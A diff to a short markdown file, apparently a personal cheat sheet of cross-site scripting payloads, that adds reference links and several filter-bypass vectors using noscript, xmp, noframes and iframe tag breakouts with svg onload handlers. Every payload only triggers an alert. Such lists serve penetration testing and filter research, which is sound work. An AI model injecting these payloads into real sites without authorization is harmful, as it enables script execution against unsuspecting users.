@@ -1,7 +1,14 @@
 # xss sets
+[About Google](https://nosec.org/home/detail/2449.html)
+[Xss Sets](https://www.hahwul.com/2019/04/bypass-xss-protection-with-xmp-noscript-etc....html)
 ```JavaScript
-<script></script>
+<script>alert(1)</script>
 '"><script>alert(1)</script>
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 <noscript><p title="</noscript><svg/onload=alert(1)>">
+<xmp><p title="</xmp><svg/onload=alert(1)>">
+<noframes><p title="</noframes><svg/onload=alert(1)>">
+<iframe><p title="</iframe><svg/onload=alert(1)>">
+<iframe style="visibility:hidden"><p title="</iframe><svg/onload=alert(1)>">
+<svg onload=alert(document.domain)>
 ```
